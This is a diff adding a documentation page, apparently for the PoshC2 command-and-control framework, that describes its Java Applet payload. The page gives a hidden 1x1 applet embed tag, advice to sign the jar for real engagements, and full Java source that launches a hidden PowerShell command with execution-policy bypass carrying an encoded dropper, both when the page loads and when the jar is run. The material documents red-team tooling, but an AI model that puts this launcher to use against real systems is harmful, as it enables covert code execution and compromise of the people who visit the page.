@@ -1,3 +1,42 @@
 ################
   Java Applet
 ################
+With the latest security updates applied to Java, the only real avenue of attack using a Java Applet is if the jar is signed. PoshC2 creates a Java Applet and an accompanying html document where the Jar is embedded, however, leaves the Applet unsigned. It is highly recommended that if using this payload on a real engagement you purchase a code signing certifcate that can sign Java Applets. This Jar file can be called by either embedding as a Java Applet in a webpage or used on the command line using the following command::
+
+	Java -Jar PoshC2.jar
+
+Otherwise the file should be hosted on a webpage and embedded using the following HTML code::
+
+	<applet code="JavaPS" width="1" height="1" archive="JavaPS.jar"></applet>  
+
+The Java code to execute "powershell.exe" is as follows::
+
+	import java.applet.*;
+	import java.awt.*;
+	import java.io.*;
+
+	public class JavaPS extends Applet {
+
+	  public static void foobar() {
+	    Process a;
+	    String b = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e <encoded core dropper>";
+	    
+	    try {
+	      System.out.println("Running Java");
+	      a = Runtime.getRuntime().exec(b);
+	    }
+	    catch(IOException e) {
+	      System.out.println(e);
+	      e.printStackTrace();
+	    }
+
+	  }
+	  
+	  public static void main(String[] args) {
+	    foobar();
+	  }
+	  
+	  public void init() {
+	    foobar();
+	  }
+	}
